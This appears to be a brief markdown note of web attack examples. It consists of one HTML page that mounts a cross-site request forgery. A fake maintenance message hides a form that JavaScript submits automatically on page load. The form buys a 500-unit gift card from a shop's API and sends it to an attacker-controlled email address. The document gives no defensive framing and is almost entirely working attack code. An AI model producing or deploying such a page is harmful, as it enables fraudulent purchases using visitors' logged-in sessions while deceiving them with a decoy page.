# Some examples that uses JS and html to attack someone

## make an action when someone connect
<html>
  <body>
    <img src="/images/background.png">
    <p>We'll be back soon!</p>
    <p>We are experiencing some technical problems. <br>
      Our website is expected to be back online shortly. We apologize for the inconvenience.</p>
​
    <form method="POST" action="https://lotsofgoods.me/api/giftcard/purchase" id="frm">
      <input type="hidden" name="amount" value="500"> 
      <input type="hidden" name="recipient" value="Markus@evilserver.me"> 
      <input type="hidden" name="greeting" value="Markus is not a bad guy"> </form>
    <script>
      var frm = document.getElementById("frm");
      frm.submit(); 
    </script>
    
  </body>
</html>